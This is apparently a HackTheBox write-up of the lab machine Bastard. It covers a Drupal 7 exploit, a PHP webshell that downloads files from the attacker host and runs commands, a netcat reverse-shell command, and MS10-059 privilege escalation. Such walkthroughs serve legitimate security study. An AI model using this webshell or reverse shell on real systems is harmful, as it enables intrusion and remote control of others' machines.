---
title: "HackTheBox | Bastard"
layout: post
date: 2023-08-16 12:00
tag: 
- HackTheBox
- Pentesting
- Bastard
- Windows
- Medium
- perl_startup
- SUID
- NFS
image: https://labs.hackthebox.com/storage/avatars/a8d2ae87fbe6d1ccfe93522d74defb3a.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "An easy retired HackTheBox machine."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

Bastard is a medium Windows HackTheBox machine Bastard that requires some knowledge of PHP in order to modify and use the proof of concept required for initial entry. This machine demonstrates the potential severity of vulnerabilities in content management systems.

---

# Nmap

```bash
nmap -A -T4 10.10.10.9         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 10:25 +01
Nmap scan report for 10.10.10.9
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

As always let's start checking the port 80 :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113104429.png>)

Heem, this web app is running Drupal 7 :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113124019.png>)

The `changelog.txt` file shows us the exacte version :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113105449.png>)

[https://www.exploit-db.com/exploits/41564](https://www.exploit-db.com/exploits/41564)

As specified in the exploit above, I checked the `/rest_endpoint` but it says not found! 

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113110750.png>)

Then I checked just the `/rest` and it does exist :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113110800.png>)

Running the exploit triggers an error, so I needed to install the php-curl :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113111207.png>)

```bash
sudo apt-get install php-curl
```

[https://gist.github.com/devzspy/a85856e6f17eeefb328b2c37810db6f6](https://gist.github.com/devzspy/a85856e6f17eeefb328b2c37810db6f6)

And I used the php shell above to upload a webshell :

```php
$phpCode = <<<'EOD'
<?php 
if (isset($_REQUEST['fupload'])) { 
	file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.24/" . $_REQUEST['fupload'])); 
}; 
if (isset($_REQUEST['fexec'])) { 
	echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>"; 
}; 
?>
EOD;
```

Also I adjusted the exploit to make it work for me :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113120208.png>)

And the webshell is uploaded successfully :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113111802.png>)

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113120127.png>)

Let's get a reverse shell on my machine :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113120427.png>)

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113120603.png>)

```bash
nc.exe -e cmd.exe 10.10.14.24 9999
```

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113120522.png>)

And now I am in as iusr user :

# User flag

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113120505.png>)

I can read the user flag easily :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113120728.png>)

# PE

Checking the `whoami /priv` we see that SeImpersonatePrivilege is Enabled, so I thought about the JuicyPotato! 

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113120903.png>)

But unfortunately it didn't work!

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113123731.png>)

So I run the exploit suggester :

```bash
python2 windows-exploit-suggester.py --database 2024-01-12-mssb.xls --systeminfo systeminfo.txt
```

And it is our friend MS10-059 again!

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113123510.png>)

[https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113123651.png>)

Running the exploit gives us a SYSTEM shell :

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113123437.png>)

And now we can read the root flag !

![alt text](<../../../assets/images/HTBPics/Pasted image 20240113123611.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>